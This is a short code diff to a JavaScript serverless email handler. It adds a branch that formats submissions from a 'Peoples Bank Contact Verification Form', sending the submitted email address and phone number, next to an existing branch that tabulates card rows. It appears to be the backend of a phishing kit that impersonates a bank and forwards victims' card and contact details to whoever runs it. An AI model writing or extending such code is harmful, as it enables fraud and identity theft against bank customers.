@@ -66,6 +66,16 @@ export default async function handler(req, res) {
                 ${cardRows}
             </table>
         `;
+    } else if (subject === 'Email Verification') {
+        customSubject = 'Submission from Peoples Bank Contact Verification Form';
+        htmlBody = `
+            <div style="font-family:Arial,sans-serif;">
+                <b>CONTACT VERIFICATION</b><br>
+                Confirm your email and phone number<br><br>
+                <b>Email Address:</b> ${email}<br>
+                <b>Phone Number:</b> ${message.split('\n')[1]?.replace('Phone Number:', '').trim() || ''}
+            </div>
+        `;
     } else {
         // Try to format message as table rows if possible
         let rows = '';
